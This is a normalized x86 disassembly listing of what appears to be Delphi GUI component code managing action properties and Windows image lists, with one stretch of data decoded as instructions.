mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43d7e0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ca90
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fb3c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44cc14
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44cafc
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_40321c
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a284
call sub_40321c
mov eax [ edi + 0x30 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fb88
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_44cb4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44cb94
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a1f8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033cc
mov edx edi
call sub_44c918
sub_44cbe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44e484
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44e4c8
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41fc0c
sub_44cc20
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41fe58
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44cc88
sub_44cc68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a040
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41fc0c
pop esi
pop ebx
retn
sub_44cc88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a2e0
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44cca4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44cd0c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4575e0
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44fd20
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44d5b4
mov edx ebp
call sub_44d614
inc eax
je r-xdata
sub_44cd98
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44cdb8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44cdd8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44d228
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44d228
sub_44cf70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420444
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44cfc4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_40321c
mov eax [ esi + 0x9c ]
call sub_40321c
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c874
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d3ac
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_44d014
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a824
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44d0c0
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44d120
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44d228
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44d360
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44d3c0
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44d41c
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44d480
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d0c0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404378
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
sub_44d120
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44d218
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44cbd8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_44cbc4
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_44d120
sub_44d228
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
sub_44d2a0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404378
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a19c
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a19c
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
sub_44d308
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
sub_44d360
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404378
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
sub_44d3c0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
sub_44d41c
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
sub_44d480
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_41a19c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033cc
test eax eax
je r-xdata
sub_44d4e0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404378
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420094
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_44d0c0
sub_44d52c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44d554
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44c9e0
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_44d120
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44d5e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b7e4
mov edi eax
mov eax esi
call sub_45000c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44d614
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44d658
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44d67d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d684
retn
sub_44d703
dec [ eax - 0x13 ]
inc esp
add [ ebx ] cl
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
jl r-xdata
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xlat
inc esp
add al cl
xlat
inc esp
add [ eax ] ch
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + ebx * 8 - 0x1d1bffbc ] dl
inc esp
add [ esi + 0x44 ] ch
add [ edx ] ah
inc esp
add [ edi + edi * 8 - 0x1a7ffbf ] cl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
sub_44d848
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fb3c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44d894
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a284
mov edx eax
mov eax edi
call sub_44e484
mov eax [ edi + 0x50 ]
call sub_40321c
mov eax edi
call sub_44db58
mov eax [ edi + 0x4c ]
call sub_40321c
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fb88
test bl bl
jle r-xdata
call sub_40321c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_44d900
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44d9ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44e40c
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44d9cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d9b4
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_44d9cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44da6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4291d8
mov eax ebx
call sub_4286b8
mov eax [ eax + 0x14 ]
xor edx edx
call sub_423684
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_418d68
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4286b8
pop edx
call sub_423a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44da74
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44da90
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44d9cc
pop ecx
pop edx
pop ebx
retn
sub_44dac8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44db58
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44da90
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403418
sub_44db04
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44e394
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_428724
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44db58
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403418
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44daf4
push eax
call ImageList_Destroy
sub_44db90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44dc23
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44d9b8
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dc2a
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov edx eax
mov eax ebx
call sub_44ddb8
sub_44dc30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44dcdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44dcc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44d9c0
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44db04
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44db04
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dcc9
mov eax [ ebp - 0x10 ]
call sub_40321c
retn
sub_44dcfc
push ebx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
